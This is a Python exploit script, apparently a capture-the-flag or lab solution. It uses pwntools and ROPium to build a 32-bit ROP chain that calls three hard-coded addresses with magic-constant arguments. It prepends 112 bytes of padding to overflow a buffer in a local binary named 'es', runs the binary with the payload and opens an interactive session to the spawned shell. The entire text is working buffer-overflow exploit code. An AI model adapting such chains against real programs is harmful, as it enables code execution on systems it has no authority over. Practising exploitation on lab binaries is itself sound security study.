from ropium import *
from pwn import *

file_path = 'es'
exe = ELF(file_path)

# Specify compile architecture of binary, ABI and load binary in Ropium
rop = ROPium(ARCH.X86)
rop.load(file_path)
rop.abi = ABI.X86_CDECL
# rop.bad_bytes = [0x00]

# Build ROP chain
chain = rop.compile('0x080491e5(0xdeadbeef)')
chain += rop.compile('0x08049236(0xcafebabe, 0x0badf00d)')
chain += rop.compile('0x080491b6()')
print(chain.dump())

ropchain = b'A' * (108 + 4) + chain.dump('raw') #  .replace(b'\x00',b'')

# Executing the executable with ropchain as input
io = process([file_path, ropchain])

# To manually interact with the spawn shell
io.interactive()
